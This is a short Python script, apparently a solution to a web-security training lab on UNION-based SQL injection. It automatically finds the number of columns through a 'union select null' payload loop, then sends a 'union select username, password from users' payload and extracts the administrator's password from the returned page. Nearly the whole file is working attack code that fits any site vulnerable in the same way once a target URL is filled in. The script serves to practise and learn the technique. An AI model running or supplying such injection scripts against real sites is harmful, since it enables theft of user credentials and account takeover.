import requests as r
from time import sleep


# lab name: SQL injection UNION attack, retrieving data from other tables



link = "" # without the last backslash

vuln_path = "/filter?category=Pets"


# i write it already in the lab 4 in order to retrieve the number of columns
def found_columns():

    col = 0
    response ="Error"
    payload="\' union select "
    while "Error" in  response : 
        if col == 0:
            payload += "null"
        else:
            payload+=",null"
        finalLink = link+vuln_path+payload + " --"
        col+=1
        my_req = r.get(finalLink)
        response = my_req.text
        print(finalLink)
        
        sleep(0.4)

    print("Found {} columns".format(col))
    return col




#number_col = found_columns() # return this time 2 columns

# the lab give us some hint : 
# there is a table called users and in this table the  columns names are 'username'and 'password'
# in order to solve the lab we need to retrieve the 'administrator' password

def retrieve_pass():
    payload = "\' union select username, password from users --"
    full_link = link + vuln_path + payload

    myreq = r.get(full_link)
    response = (myreq.text).split("administrator")[1].split("</tr>")[0]
     # not very clean but the password will be printed :(
    print(response) 



retrieve_pass()